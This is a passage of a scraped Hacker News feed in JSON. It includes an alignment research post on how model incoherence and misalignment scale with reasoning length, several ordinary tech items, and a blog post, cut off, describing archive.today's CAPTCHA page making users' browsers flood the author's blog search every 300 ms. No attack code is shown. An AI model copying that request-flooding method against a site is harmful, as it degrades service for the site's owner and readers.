      "content": "The Hot Mess of AI: How Does Misalignment Scale with Model Intelligence and Task Complexity?\n\nğŸ“„Paper, ğŸ’»Code\n\nResearch done as part of the firstAnthropic Fellows\n                    Programduring Summer 2025.\n\nWhen AI systems fail, will they fail by systematically pursuing the wrong goals, or by being a hot mess?\n                We decompose the errors of frontier reasoning models into bias (systematic) and variance (incoherent)\n                components and find that, as tasks get harder and reasoning gets longer, model failures become\n                increasingly dominated by incoherence rather than systematic misalignment. This suggests that future AI\n                failures may look more like industrial accidents than coherent pursuit of a goal we did not train them to pursue.\n\nIntroduction\n\nAs AI becomes more capable, we entrust it with increasingly consequential tasks. This makes understandinghowthese systems might fail even more critical for safety. A central concern in AI alignment\n            is that\n            superintelligent systems might coherently pursue misaligned goals: the classicpaperclip\n                maximizerscenario. But there's another possibility: AI might fail not through systematic\n            misalignment, but throughincoherenceâ€”unpredictable, self-undermining behavior that doesn't\n            optimize for any consistent objective. That is, AI might fail in the same way that humans often fail, by being ahot mess.\n\nThis paper builds on thehot mess theory\n                of misalignment(Sohl-Dickstein, 2023), which surveyed experts to rank various entities (including\n            humans, animals, machine learning models, and organizations) by intelligence and coherence independently. It\n            found thatsmarterentities are subjectively judged to behavelesscoherently. We take\n            this hypothesis from\n            survey data to empirical measurement across frontier AI systems, asking:As models become more\n                intelligent and tackle harder tasks, do their\n                failures look more like systematic misalignment, or more like a hot mess?\n\nMeasuring Incoherence: A Bias-Variance Decomposition\n\nTo quantify incoherence we decompose AI errors using the classic bias-variance framework:\n\nBiascaptures consistent, systematic errorsâ€”achieving the\n                wrong outcome reliably\n\nVariancecaptures inconsistent errorsâ€”unpredictable outcomes\n                across samples\n\nWe defineincoherenceas the fraction of error attributable to variance:\n\nAn incoherence of 0 means all errors are systematic (classic misalignment risk). An incoherence of 1 means\n            all errors are random (the hot mess scenario). Crucially, this metric is independent of overall performance:\n            a model can improve while becoming more or less coherent.\n\nKey Findings\n\nWe evaluated frontierAt the time of\n                this research in Summer 2025.reasoning models (Claude Sonnet 4, o3-mini, o4-mini, Qwen3)\n            across multiple-choice\n            benchmarks (GPQA, MMLU), agentic coding (SWE-Bench), and safety evaluations (Model-Written Evals). We also\n            train our own small models on synthetic optimization tasks, which makes the connection to LLMs as dynamical\n            systems and optimizers explicit.\n\nFinding 1: Longer reasoning â†’ More incoherence\n\nAcross all tasks and models, the longer models spend reasoning and taking actions, the more incoherent they\n            become. This holds whether we measure reasoning tokens, agent actions, or optimizer steps.\n\nFinding 2: Scale improves coherence on easy tasks, not hard ones\n\nHow does incoherence change with model scale? The answer depends on task difficulty:\n\nEasy tasks:Larger models become more coherent\n\nHard tasks:Larger models becomemore incoherentor\n                remain unchanged\n\nThis suggests that scaling alone won't eliminate incoherence. As more capable models tackle harder problems,\n            variance-dominated failures persist or worsen.\n\nFinding 3: Natural \"overthinking\" increases incoherence more than reasoning budgets reduce it\n\nWe find that when models spontaneously reason longer on a problem (compared to their median), incoherence\n            spikes\n            dramatically. Meanwhile, deliberately increasing reasoning budgets through API settings provides only modest\n            coherence improvements. The natural variation dominates.\n\nFinding 4: Ensembling reduces incoherence\n\nAggregating multiple samples reduces variance (as expected from theory), providing a path to more coherent\n            behavior, though this may be impractical for real-world agentic tasks where actions are irreversible.\n\nWhy Should We Expect Incoherence? LLMs as Dynamical Systems\n\nA key conceptual point:LLMs are dynamical systems, not optimizers.When a language model\n            generates text or takes actions, it traces trajectories through a high-dimensional state space. It has to betrainedto act as an optimizer, andtrainedto align with human intent. It's unclear which\n            of these properties will be more robust as we scale.\n\nConstraining a generic dynamical system to act as a coherent optimizer is extremely difficult. Often the number of\n            constraints required for monotonic progress toward a goal grows exponentially with the dimensionality of the\n            state space. We shouldn't expect AI to act as coherent optimizers without considerable effort, and this\n            difficulty doesn't automatically decrease with scale.\n\nThe Synthetic Optimizer: A Controlled Test\n\nTo probe this directly, we designed a controlled experiment: train transformers toexplicitlyemulate an optimizer. We generate training data from steepest descent on a quadratic loss function, then\n            train models of varying sizes to predict the next optimization step given the current state (essentially:\n            training a \"mesa-optimizer\").\n\nThe results are interesting:\n\nIncoherence grows with trajectory length.Even in this\n                idealized setting, the more optimization steps models take (and get closer to the correct solution), the\n                more incoherent they become.\n\nScale reduces bias faster than variance.Larger models learn\n                thecorrect objectivemore quickly than they learn toreliably pursue it. The gap\n                between \"knowing what to do\" and \"consistently doing it\" grows with scale.\n\nImplications for AI Safety\n\nOur results are evidence that future AI failures may look more likeindustrial accidentsthancoherent pursuit of goals that were not trained for. (Think: the AI intends to run the nuclear power\n            plant, but gets distracted reading French poetry, and there is a meltdown.) However, coherent pursuit of poorly chosen goals that we trained for remains a problem. Specifically:\n\nVariance dominates on complex tasks.When frontier models\n                fail on difficult problems requiring extended reasoning, there is a tendency for failures to be\n                predominantly incoherent rather than systematic.\n\nScale doesn't imply supercoherence.Making models larger improves\n                overall accuracy but doesn't reliably reduce incoherence on hard problems.\n\nThis shifts alignment priorities.If capable AI is more\n                likely to be a hot mess than a coherent optimizer of the wrong goal, this increases the relative\n                importance of research targetingreward hackingandgoal misspecificationduring\n                trainingâ€”the bias termâ€”rather than focusing primarily on aligning and constraining a perfect optimizer.\n\nUnpredictability is still dangerous.Incoherent AI isn't\n                safe AI. Industrial accidents can cause serious harm. But thetypeof risk differs from classic\n                misalignment scenarios, and our mitigations should adapt accordingly.\n\nConclusion\n\nWe use the bias-variance decomposition to systematically study how AI incoherence scales with model\n            intelligence and task complexity. The evidence suggests that as AI tackles harder problems requiring more\n            reasoning and action, its failures tend to become increasingly dominated by variance rather than bias. This\n            doesn't eliminate AI riskâ€”but it changes what that risk looks like, particularly for problems that are currently hardest for models, and should inform how we prioritize\n            alignment research.\n\nAcknowledgements\n\nWe thank Andrew Saxe, Brian Cheung, Kit Frasier-Taliente, Igor Shilov, Stewart Slocum, Aidan Ewart, David\n            Duvenaud, and Tom\n            Adamczewski for extremely helpful discussions on topics and results in this paper.",
      "url": "https://alignment.anthropic.com/2026/hot-mess-of-ai/",
      "author_username": "salkahfi",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 210,
      "impressions_reposts": 0,
      "impressions_replies": 65,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:26.901923",
      "published_at": "2026-02-02T19:28:06",
      "scraped_at": "2026-02-03T09:02:26.901934",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46864498",
        "kids_count": 25,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "6c4830fcf68d18c2e39c91ba7a3222d4"
    },
    {
      "id": "ed10ca3807eebc726c94f3cec42b2696",
      "source": "hackernews",
      "source_id": "46861842",
      "title": "GitHub experience various partial-outages/degradations",
      "content": "Resend OTP in:seconds\n\nDidn't receive the OTP?Resend OTP\n\nResend OTP in:30seconds\n\nDidn't receive the OTP?Resend OTP\n\nThe URL we should send the webhooks to\n\nWe'll send you email if your endpoint fails\n\nAll Systems Operational\n\nAbout This Site\n\nCheck GitHub Enterprise Cloud status by region:- Australia:au.githubstatus.com- EU:eu.githubstatus.com- Japan:jp.githubstatus.com- US:us.githubstatus.com\n\nPast Incidents\n\nNo incidents reported.\n\nNo incidents reported.\n\nNo incidents reported.\n\nNo incidents reported.\n\nNo incidents reported.\n\nNo incidents reported.\n\nSubscribe to our developer newsletter\n\nGet tips, technical guides, and best practices. Twice a month. Right in your\r\n          inbox.",
      "url": "https://www.githubstatus.com?todayis=2026-02-02",
      "author_username": "bhouston",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://user-images.githubusercontent.com/19292210/60553863-044dd200-9cea-11e9-987e-7db84449f215.png",
          "alt": "GitHub header"
        },
        {
          "type": "image",
          "url": "https://user-images.githubusercontent.com/19292210/60553865-044dd200-9cea-11e9-859c-d6f266e2f01f.png",
          "alt": "GitHub header"
        },
        {
          "type": "image",
          "url": "https://user-images.githubusercontent.com/19292210/60553864-044dd200-9cea-11e9-996a-a7a316ec3a35.png",
          "alt": "GitHub footer"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 236,
      "impressions_reposts": 0,
      "impressions_replies": 83,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:27.075835",
      "published_at": "2026-02-02T16:28:16",
      "scraped_at": "2026-02-03T09:02:27.075846",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46861842",
        "kids_count": 20,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "a2b8fea44c184889726b7a0a02cf94a1"
    },
    {
      "id": "de40ef9358364b126c94224fa081d390",
      "source": "hackernews",
      "source_id": "46867947",
      "title": "Show HN: Minikv â€“ Distributed key-value and object store in Rust (Raft, S3 API)",
      "content": "ğŸ¦€ minikv\n\nA distributed, multi-tenant key-value & object store written in Rust\n\nminikv provides strong consistency (Raft + 2PC), durability (WAL), and production-grade observability, security, and multi-tenancy â€” all in a modern Rust codebase.\n\nBuilt in public as a learning-by-doing project â€” now evolved into a complete, reference implementation of distributed systems in Rust.\n\nğŸš¦ What's New in v0.8.0\n\nminikv v0.8.0 brings enterprise-grade features for distributed deployments:\n\nCross-datacenter replication:Async replication with multiple conflict resolution strategies (LWW, Vector Clocks)\n\nChange Data Capture (CDC):Real-time event streaming to Webhook, Kafka, or file sinks\n\nAdmin Web UI:Embedded dashboard for cluster monitoring and management\n\nBackup & Restore:Full and incremental backups with encryption support\n\nPlugin system:Extensible architecture for custom storage, auth, and hooks\n\nPrevious highlights (v0.7.0): secondary indexes, multi-key transactions, batch import/export, durable S3 backend.\n\nğŸ“š Table of Contents\n\nWhat is minikv?\n\nTech Stack\n\nQuick Start\n\nArchitecture\n\nPerformance\n\nFeatures\n\nRoadmap\n\nStory\n\nDocumentation\n\nDevelopment\n\nContributing\n\nContact\n\nğŸ¤” What is minikv?\n\nminikv is a distributed key-value store written inRust, designed for simplicity, speed, and reliability.\n\nWho is this forÂ ?minikv is for engineers learning distributed systems, teams experimenting with Rust-based infrastructure, and anyone curious about consensus, durability, and system trade-offs.\n\nClusteredÂ :Raft consensus and 2PC for transactional writes\n\nVirtual ShardingÂ :256 vshards for elastic scaling & balancing\n\nWALÂ :Write-ahead log for durability\n\ngRPCfor node communication,HTTP REST & S3 APIfor clients\n\nBloom filters, snapshots, watch/subscribefor performance & reactivity\n\nğŸ›  Tech Stack\n\nRustâ€“ core logic\n\nShellâ€“ orchestration/automation\n\nJavaScriptâ€“ benchmarks, tools\n\nMakefileâ€“ build flows\n\nâš¡ Quick Start\n\nFor cluster setup and advanced options, see thedocumentation.\n\nğŸ“ Architecture\n\nRaft: consensus and leader election\n\n2PC: atomic distributed/batch writes\n\nVirtual Shards: scale and rebalance across 256 partitions\n\nPluggable Storage: in-memory, RocksDB, Sled\n\nAdmin API: HTTP endpoints for status, metrics and config\n\nConfig: via environment, file or CLI flags\n\nğŸš€ Performance\n\nWrite throughputÂ : over 50,000 operations/sec (single node, in-memory)\n\nSub-millisecond read latency\n\nCluster tested (3â€“5 nodes, commodity VMs)\n\nBuilt-in Prometheus metrics\n\nğŸŒŸ Features\n\nDistributed Core\n\nRaft consensus (multi-node, strong consistency)\n\nTwo-phase commit (2PC) for atomic multi-key transactions\n\n256 virtual shards for cluster scaling and rebalancing\n\nWrite-ahead log (WAL) for durability\n\nAuto-rebalancing, graceful leader failover, hot-join and node removal\n\nData Management\n\nTime-To-Live keys (TTL)\n\nLZ4 compression (configurable)\n\nBloom filters and index snapshots\n\nPluggable and persistent storage: in-memory, RocksDB, Sled\n\nBatch & range operations, prefix queries\n\nAPI\n\nHTTP REST (CRUD, batch, range, admin)\n\nS3-compatible API (with TTL extensions)\n\ngRPC (internal)\n\nWebSocket and SSE endpoints for real-time watch/subscribe events\n\nSecurity & Multi-tenancy\n\nAPI keys (Argon2) and JWT authentication\n\nRole-based access control (RBAC) and audit logging\n\nMulti-tenant isolation\n\nAES-256-GCM encryption at rest\n\nPer-tenant quotas (storage, requests, rate limits)\n\nTLS (HTTP & gRPC)\n\nObservability\n\nAdmin dashboard\n\nPrometheus metrics (counters, histograms)\n\nRequest and endpoint statistics\n\nStructured logging and tracing spans\n\nKubernetes health probes\n\nProduction-grade Design\n\nMemory-safe Rust\n\nTest suite, automated CI\n\nDocumentation and sample config\n\nSingle static binary\n\nğŸ—ºï¸ Roadmap\n\nv0.8.0 (latest)\n\nCross-datacenter replication\n\nChange Data Capture (CDC)\n\nAdmin Web UI\n\nBackup & Restore\n\nPlugin system\n\nv0.7.0\n\nSecondary indexes\n\nMulti-key transactions\n\nDurable S3-backed object store\n\nBatch import/export\n\nNext (v0.9.0+)\n\nKubernetes Operator\n\nGraphQL API\n\nTime-series optimizations\n\nGeo-partitioning\n\nğŸ“– Story\n\nminikv started as a 24-hour challenge by a Rust learner (82 days into the language!). It now serves as both a playground and a reference for distributed systems, demonstrating curiosity, learning-by-doing, and robust engineering.\n\nğŸ“š Documentation\n\nExample configÂ :config.example.toml\n\nCluster, API, usageÂ :seedocs/\n\nCertificate generationÂ :certs/README.md\n\nğŸ› ï¸ Development\n\nContinuous Integration runs on push & PR via.github/workflows/ci.yml.\n\nğŸ¤ Contributing\n\nIssues and PRs welcome! SeeCONTRIBUTING.md.\n\nğŸ“¬ Contact\n\nGitHub:whispem/minikv\n\nEmail: via GitHub profile",
      "url": "https://github.com/whispem/minikv",
      "author_username": "whispem",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/9256bb31f4c255696962872b4df731714c082140879de3e0c1ea605cbe622b93/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6769746875622d7768697370656d2532466d696e696b762d626c7565",
          "alt": "Repo"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/43757a465111af93885fb2c2cfd5c30dc73aef62d39107dd53c204a1435d2e60/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f727573742d312e38312b2d6f72616e67652e737667",
          "alt": "Rust"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/fdf2982b9f5d7489dcf44570e714e3a15fce6253e0cc6b5aa61a075aac2ff71b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4d49542d79656c6c6f772e737667",
          "alt": "License: MIT"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/eb0a01387c30d799a5267493ce7a4882025dd0df51932d859f215659c644d2bf/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f7374617475732d70726f64756374696f6e5f67726164652d73756363657373",
          "alt": "Production Grade"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 45,
      "impressions_reposts": 0,
      "impressions_replies": 9,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:27.787378",
      "published_at": "2026-02-03T03:00:19",
      "scraped_at": "2026-02-03T09:02:27.787390",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46867947",
        "kids_count": 6,
        "sections": [
          "top_stories",
          "show_hn"
        ]
      },
      "content_hash": "164eb7d2398d3795a7728490ad545af9"
    },
    {
      "id": "1683cca1831eee91ff17dfe038f4062f",
      "source": "hackernews",
      "source_id": "46829029",
      "title": "See how many words you have written in Hacker News comments",
      "content": "Prolificacy Analyzer\n\nTop 1000 Prolific Writers",
      "url": "https://serjaimelannister.github.io/hn-words/",
      "author_username": "Imustaskforhelp",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 101,
      "impressions_reposts": 0,
      "impressions_replies": 153,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:28.247315",
      "published_at": "2026-01-30T14:54:52",
      "scraped_at": "2026-02-03T09:02:28.247341",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46829029",
        "kids_count": 58,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "5ea59fd55f06dd67acddd6b99744c5e5"
    },
    {
      "id": "c2b0ad6b716b56177156cddf8cdc0a3b",
      "source": "hackernews",
      "source_id": "46857488",
      "title": "Ask HN: Who is hiring? (February 2026)",
      "content": "Please state the location and include REMOTE for remote work, REMOTE (US)\nor similar if the country is restricted, and ONSITE when remote work is <i>not</i> an option.<p>Please only post if you personally are part of the hiring companyâ€”no\nrecruiting firms or job boards. One post per company. If it isn&#x27;t a household name,\nexplain what your company does.<p>Please only post if you are actively filling a position and are committed\nto replying to applicants.<p>Commenters: please don&#x27;t reply to job posts to complain about\nsomething. It&#x27;s off topic here.<p>Readers: please only email if you are personally interested in the job.<p>Searchers: try <a href=\"https:&#x2F;&#x2F;dheerajck.github.io&#x2F;hnwhoishiring&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;dheerajck.github.io&#x2F;hnwhoishiring&#x2F;</a>,\n<a href=\"http:&#x2F;&#x2F;nchelluri.github.io&#x2F;hnjobs&#x2F;\" rel=\"nofollow\">http:&#x2F;&#x2F;nchelluri.github.io&#x2F;hnjobs&#x2F;</a>, <a href=\"https:&#x2F;&#x2F;hnresumetojobs.com\" rel=\"nofollow\">https:&#x2F;&#x2F;hnresumetojobs.com</a>,\n<a href=\"https:&#x2F;&#x2F;hnhired.fly.dev\" rel=\"nofollow\">https:&#x2F;&#x2F;hnhired.fly.dev</a>, <a href=\"https:&#x2F;&#x2F;kennytilton.github.io&#x2F;whoishiring&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;kennytilton.github.io&#x2F;whoishiring&#x2F;</a>,\n<a href=\"https:&#x2F;&#x2F;hnjobs.emilburzo.com\" rel=\"nofollow\">https:&#x2F;&#x2F;hnjobs.emilburzo.com</a>, or this (unofficial) Chrome extension:\n<a href=\"https:&#x2F;&#x2F;chromewebstore.google.com&#x2F;detail&#x2F;hn-hiring-pro&#x2F;mpfaljjblphnlloddaplgicpkinikjlp\" rel=\"nofollow\">https:&#x2F;&#x2F;chromewebstore.google.com&#x2F;detail&#x2F;hn-hiring-pro&#x2F;mpfal...</a>.<p>Don&#x27;t miss this other fine thread: <i>Who wants to be hired?</i> <a href=\"https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=46857487\">https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=46857487</a>",
      "url": null,
      "author_username": "whoishiring",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 286,
      "impressions_reposts": 0,
      "impressions_replies": 359,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:28.247430",
      "published_at": "2026-02-02T11:01:30",
      "scraped_at": "2026-02-03T09:02:28.247437",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46857488",
        "kids_count": 300,
        "sections": [
          "top_stories",
          "best_stories",
          "ask_hn"
        ]
      },
      "content_hash": "614125689d2d7a71de73e00e49e685bb"
    },
    {
      "id": "06f2399db37494f6e21ed6e8a6b5def7",
      "source": "hackernews",
      "source_id": "46822177",
      "title": "The Connection Machine CM-1 \"Feynman\" T-shirt",
      "content": "The Connection Machine\n\nCM-1/CM-2 \"Feynman\" T-shirts\n\nSkip the lecture andOrder T-shirts in the USA- or -Order T-shirts in Europe.\n\nCM-1 Logo design:\n\nThis is the t-shirt logo I designed in 1983, even before we had come up with the design for the CM-1 itself. In fact, we designed the CM-1 to look like this  logo, thus making it the only supercomputer designed after a t-shirt!\n\nThe t-shirt  became famous in the 1990s when  Apple   used a photo of Nobel physicist Richard Feynman wearing it in their \"Think different\" campaign. Read my article on theDesign of the Connection Machineto see why he wore it!\n\n(See also  Thunkophoto shoot.)\n\nShort explanation of the logo:\n\nThe geometric boxes and their 'hard' connections represent the 12-dimensional 'cube of cubes' that forms the internal hardware network connecting all processor chips with each other in a maximum of 12 steps. Feynman is the one who suggested this  structure, and I played with the topology until I came up with this representation, which can be expanded for an infinite number of dimensions.\n\nThe  pom-poms and their 'soft' connections represent the software data structures inside the machine, which  need not follow the topology of the hardware network.\n\nFor the full story, read the chapter \"Architecture of a new machine\"\r\n      in myarticleon designing the look of the Connection Machine!\n\nColors:\r\n    There are many color schemes, but I consider the 'classic' CM-1 to be:\n\nt-shirt: black like the machine itself\n\n12-dimensional cube of cubes: yellow-gold for the hardware network\n\n'pom-poms:' red like the blinking  red processor status lights\n\nOrder the Feynman CM-1 t-shirt in the USA:\n\n(For questions on ordering or returns, please see the spreadshirtcustomer help.\n\nOrder the Feynman CM-1 t-shirt in Europe:\n\n(For questions on ordering or returns, please see the spreadshirtcustomer help.)",
      "url": "https://tamikothiel.com/cm/cm-tshirt.html",
      "author_username": "tosh",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 97,
      "impressions_reposts": 0,
      "impressions_replies": 20,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:28.628951",
      "published_at": "2026-01-30T04:10:48",
      "scraped_at": "2026-02-03T09:02:28.628969",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46822177",
        "kids_count": 9,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "477ca01666c799bb74ff59b9a3d6eb3d"
    },
    {
      "id": "2ba60ffd342d3a577f461e82c6164088",
      "source": "hackernews",
      "source_id": "46870113",
      "title": "Lead in archived hair documents a decline in lead exposure to humans after EPA",
      "content": "Lead in archived hair documents a decline in lead exposure to humans after EPA",
      "url": "https://www.pnas.org/doi/10.1073/pnas.2525498123",
      "author_username": "robtherobber",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 17,
      "impressions_reposts": 0,
      "impressions_replies": 1,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:28.793702",
      "published_at": "2026-02-03T07:23:12",
      "scraped_at": "2026-02-03T09:02:28.793729",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870113",
        "kids_count": 1,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "040f054560cfec1de3d4ede12cc3684b"
    },
    {
      "id": "1f8c1a2788eca1079de8a0f4954be826",
      "source": "hackernews",
      "source_id": "46862170",
      "title": "xAI joins SpaceX",
      "content": "xAI joins SpaceX",
      "url": "https://www.spacex.com/updates#xai-joins-spacex",
      "author_username": "g-mork",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 774,
      "impressions_reposts": 0,
      "impressions_replies": 1718,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:28.894742",
      "published_at": "2026-02-02T16:51:22",
      "scraped_at": "2026-02-03T09:02:28.894758",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46862170",
        "kids_count": 207,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "92d430594f7db2636e06e75fecc8ef09"
    },
    {
      "id": "dc18d96d72bee1b35a62e96c48cfd3cf",
      "source": "hackernews",
      "source_id": "46843805",
      "title": "Archive.today is directing a DDoS attack against my blog?",
      "content": "Around January 11, 2026,archive.today(aka archive.is, archive.md, etc) started using its users as proxies to conduct a distributed denial of service (DDOS) attack againstGyrovague, my personal blog. All users encountering archive.todayâ€™s CAPTCHA page currently load and execute the following Javascript:\n\nEvery 300 milliseconds, as long as the CAPTCHA page is open, this makes a request to the search function of my blog using a random string, ensuring the response cannot be cached and thus consumes resources.\n\nYou can validate this yourself by checking the source code and network requests; if youâ€™re not being redirected to the CAPTCHA page,hereâ€™s a screenshot. uBlock Origin also stops the requests from being executed, so you may need to turn that off. At time of writing, the code above is located at line 136 of the CAPTCHA pageâ€™s top level HTML file:\n\nSo how did we end up here?\n\nBackground and timeline\n\nOnAugust 5, 2023, I published a blog post calledarchive.today: On the trail of the mysterious guerrilla archivist of the Internet. Using what cool kids these days callOSINT, meaning poking around with my favorite search engine, the post examines the history of the site, its tech stack and its funding. The post mentions three names/aliases linked to the site, but all of them had been dug up by previous sleuths and the blog post also concludes that they are all most likely aliases, so as far as â€œdoxxingâ€ goes, this wasnâ€™t terribly effective.\n\nMy motives for publishing this have been questioned, sometimes in fanciful ways. The actual rationale is boringly straightforward: I found it curious that we know so little about this widely-used service, so I dug into it, in the same way that previous posts dug into asketchy crypto coin offering,monetization dark patterns in a popular pay to win game, and theend of subway construction in Japan. Thatâ€™s it, and itâ€™s also the only post on my blog that references archive.today.\n\nThe post gathered some 10,000 views anda bit discussion on Hacker News, but didnâ€™t exactly set the blogosphere on fire. And indeed, absolutely nothing happened for the next two years and a bit.\n\nOnNovember 5, 2025,Heise Onlinereported that the FBI was now on the trail of archive.today and had subpoenaed its domain registrar Tucows. Both this report andArsTechnicaalso linked to my blog post.\n\nOnNovember 13, AdGuard DNS published aninteresting blog postabout a sketchy French organization calledWeb Abuse Association Defense(WAAD), which was trying to pressure them into blocking archive.todayâ€™s various domains. An update added on November 18 also suggests that WAAD is impersonating other people.\n\nOnJanuary 8,2026, my blog host Automattic (dba WordPress.com) notified me that they had received a GDPR complaint from a â€œNora Puchreinerâ€, alleging that my blog postâ€œcontains extensive personal data â€¦ presented in a narrative that is defamatory in tone and contextâ€. The complaint was entirely lacking in actionable detail, so I had Gemini compose a rebuttal citing journalistic exemption, public interest, failure to identify falsehoods, and host protection, and after a quick review Automattic sided with me and left the post up. Score one for AI.\n\nOnJanuary 10, I received a politely worded email from archive.todayâ€™s webmaster asking me to take down the post for a few months. Unfortunately the email was classified as spam by Gmail and I only spotted it five days later. I responded on the 15th and followed up on the 20th, but did not hear back.\n\nOnJanuary 14, a user called â€œrabinovichâ€ postedAsk HN: Weird archive.today behavior?on Hacker News, asking about the DDOS-like behavior which they claimed had started three days ago. This is, as far as I can tell, the first public mention of this anywhere, and a kind HN user brought it to my attention.\n\nOnJanuary 21, commit^bbf70ec(warning: very large) added gyrovague.com todns-blocklists, used by ad blocking services like uBlock Origin. This is actually beneficial, since if you have an ad blocker installed, the DDOS scriptâ€™s network requests are now blocked. (It does not stop users from browsing to my blog directly.)\n\nOnJanuary 25, I emailed archive.todayâ€™s webmaster for the third time with a draft of this blog post, declining to take down the post but offering to â€œchange some wording that you feel is being misrepresentedâ€. â€œNora Puchreinerâ€ responded with an increasingly unhinged series of threats:\n\nAnd threatening me with Streisandâ€¦ having such a noble and rare name, which in retaliation could be used for the name of a scam project or become a byword for a new category of AI pornâ€¦ are you serious?\n\nIf you want to pretend this never happened â€“ delete your old article and post the new one you have promised. And I will not write â€œan OSINT investigationâ€ on your Nazi grandfather, will not vibecode a gyrovague.gay dating app, etc.\n\nAt this point it was pretty clear the conversation had run its course, so here we are. And for the record, my long-dead grandfather served in an anti-aircraft unit of theFinnish Army during WW2, defending against the attacks of the Soviet Union. Perhaps this is enough to qualify as a â€œNaziâ€ in Russia these days.\n\nSpeculation\n\nThe above are easily verifiable facts, although youâ€™ll have to trust me on the email bits. (You can find alightly redacted copy of the entire email thread here.) Everything that follows is more speculative and firmly in the domain of a hall of mirrors where nothing is quite what it seems.\n\nThe big question is, of course,why, and more specificallywhy now, 2.5 years after posting, when the cat is well and truly out of the bag. As multiple people have noted, thereâ€™s nothing the Internet loves more than an attempt to attempt to censor already published information, and doing so tends to causemoreinterest in that information, aka theStreisand effect.\n\nTo summarize ouremail thread, the archive.today webmaster claims they have no beef with my article itself, but they are concerned that itâ€™s getting misquoted in other media, so it should be taken offline for a while. And in thisMastodon thread by @eb@social.coop, @iampytest@infosec.exchange quotesclaimed correspondence with the webmaster, stating that the purpose of the DDOS was to â€œattract attention and increase their hosting billâ€œ.\n\nCall me naive, but Iâ€™m inclined to take that at face value: itâ€™s a pretty misguided way of doing it, but they certainly caught my attention. Problem is, they also caught the attention of the broader Internet. They didnâ€™t do so well on the hosting bill part either, since I have a flat fee plan, meaning this has cost me exactly zero dollars.\n\nPerhaps more interesting yet are the various identities involved.\n\nâ€œNora Puchreinerâ€, who sent the GDRP takedown attempt and replied to my emails to archive.today, shows up in various places on the Internet includingHacker News, commenting on my original blog post back in 2023. Somebody by that name also has an account on Russian LiveJournal, where they postedcorrespondence between btdigg.com and an anti-piracy outfit called Ventegus. Thereâ€™s alsothis rather batty exchange on KrebsonSecurity, where â€œNora Puchreinerâ€ says various scammers are actually Ukrainian, not Russian, and a â€œDennis Pâ€ pops up to call her â€œfakeâ€ and a â€œscammerâ€.\n\nâ€œrabinovichâ€ on Hacker Newssubmittedboth the â€œAsk HNâ€ about the DDOS attack, and an apparently competing archive site calledGhostarchive. As several HN readers noted, the name â€œMasha Rabinovichâ€ is associated with archive.today.\n\nâ€œRichard PrÃ©sidentâ€ from WAAD helpfully reached out and offered to assist me with a GDPR counter-complaint, rather transparently mentioning that this could be tied to â€œa request for identity verificationâ€. (I have zero interest in pursuing this.)\n\nConclusion\n\nWell, I wish I had one, but at this stage I really donâ€™t. The most charitable interpretation would be that the investigative heat is starting to get to the webmaster and theyâ€™re lashing out in misguided self-defense. Perhaps Iâ€™ll just quoteNoraâ€™s own post on LiveJournal:\n\nAnd as the darkness closed in, Nora Puchreiner, once a seeker of truth, was swallowed by the very shadows she had sought to expose. Her name would be whispered in hushed tones by those who dared to tread the path of forbidden knowledge, a cautionary tale of a mind consumed by the cosmic horrors that lie just beyond our comprehension.\n\nLetâ€™s see what the Internet hive mind 